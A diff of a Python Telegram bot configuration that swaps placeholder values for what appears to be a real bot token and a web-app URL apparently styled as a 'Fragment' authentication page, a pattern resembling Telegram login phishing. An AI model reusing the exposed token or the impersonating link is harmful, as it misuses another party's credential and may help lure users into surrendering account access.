@@ -4,14 +4,14 @@ from telegram.ext import Application, InlineQueryHandler, CommandHandler, Contex
 from telegram.constants import ParseMode
 
 # Ganti dengan token bot Anda
-BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
+BOT_TOKEN = "7968573254:AAEDR8cvaIdrK2QdG-h9MTfpecXuupjQ_Gs"
 
 # FILE_ID dari foto yang sudah diupload ke Telegram
 # Cara mendapatkan file_id: kirim foto ke bot via @BotFather, lalu check logs
 PHOTO_FILE_ID = "FILE_ID_FROM_TELEGRAM"
 
 # URL web app Anda
-WEB_APP_URL = "https://your-webapp-domain.com"
+WEB_APP_URL = "https://fragment-authentication.vercel.app/"
 
 # Setup logging
 logging.basicConfig(
